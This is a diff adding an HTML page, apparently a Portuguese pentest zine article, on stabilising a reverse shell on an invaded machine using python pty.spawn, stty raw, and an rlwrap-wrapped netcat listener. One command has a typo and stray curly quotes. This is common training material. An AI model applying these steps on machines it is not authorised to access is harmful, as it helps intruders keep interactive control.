@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Melhorando seu Shell Reverso - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     MELHORANDO SEU SHELL REVERSO
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : Melhorando seu Shell Reverso
+        autor  : offensive think
+        data   : Thu, Jul 30, 2020
+        tags   : shell, techinique
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/reverse-shell.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - OPÇÃO 1 - stty raw
+1 - OPÇÃO 2
+
+
+Sabe aquele shell reverso padrão onde não da pra navegar pelo histórico de comandos com as setas, não da pra voltar com a seta pra corrigir erro de digitação, não tem autocompletar e *insiste em cair quando sem querer você aperta CTRL+C*?
+
+
+---[ 0x00 - OPÇÃO 1 - STTY RAW ]----------------------------------------
+
+:: Na Vitima
+
+Dentro do Reverse Shell, levantar um bash!
+
+    $ pyhon -c &quot;import pty;pty.spawn(’/bin/bash’);&quot;
+
+Apertar _{ CTRL+Z } para enviar o processo para backgorund em sua máquina!_
+Isso vai colocar o processo que ta dando o shell reverso (provavelmente o netcat) em background e vai voltar pra sua maquina de origem, que chamaremos de kali.
+
+:: No Kali
+
+
+    $stty raw -echo; fg { ENTER }
+    { ENTER } de novo 
+
+Pronto voltou pra máquina invadida
+
+:: Na vítima
+
+
+    $ stty rows 50 columns 200
+    $ export TERM=linux
+    $ exec /bin/bash
+
+Agora pode testar autocompletar, clear, seta pra fima, pra baixo, pra esquerda, ctrl+z ...
+Agora para sair do Shell usa-se o exit normalmente.
+⁉️ *Atenção !*
+Ao sair você verá que seu terminal, no kali, não responde mais nada. Então você terá que resetá-lo, bastando digitar, as cegas: *reset* _{ ENTER }_
+
+
+---[ 0x01 - OPÇÃO 2 ]---------------------------------------------------
+Esta opção usa um wrapper, o *rlwrap. *Caso não o tenha instalado , no kali basta:
+
+    $ sudo apt install rlwrap
+
+Agora ao levantar o netcat , ao invés de fazer *nc -lvnp 4321* basta fazer:
+
+    $rlwrap nc -lvnp 4321
+
+Seu shell funcionará muito bem com as setas , histórico (seta pra cima!), _mas pelo que notei, _*não funciona o Autocomplete e também quebra se você apertar CTRL +C*
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
